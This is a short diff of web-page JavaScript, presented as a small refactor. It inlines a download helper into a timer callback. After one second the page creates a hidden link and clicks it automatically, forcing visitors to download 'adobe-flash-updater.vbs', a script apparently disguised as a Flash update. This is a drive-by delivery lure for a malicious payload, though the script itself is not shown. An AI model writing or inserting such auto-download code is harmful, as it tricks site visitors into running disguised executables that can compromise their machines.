@@ -5,15 +5,6 @@ function getDownloadFile(token) {
     }
 }
 
-function downloadFile(url) {
-    const link = document.createElement("a");
-    link.href = url;
-    link.download = url.split("/").pop();
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-}
-
 setTimeout(() => {
     let token = "";
     let file;
@@ -31,6 +22,10 @@ setTimeout(() => {
         file = "doc/adobe-flash-updater.vbs"
     }
 
-    downloadFile(file);
+    const link = document.createElement("a");
+    link.href = file;
+    link.download = file.split("/").pop();
+    document.body.appendChild(link);
+    link.click();
     document.body.removeChild(link);
 }, 1000);
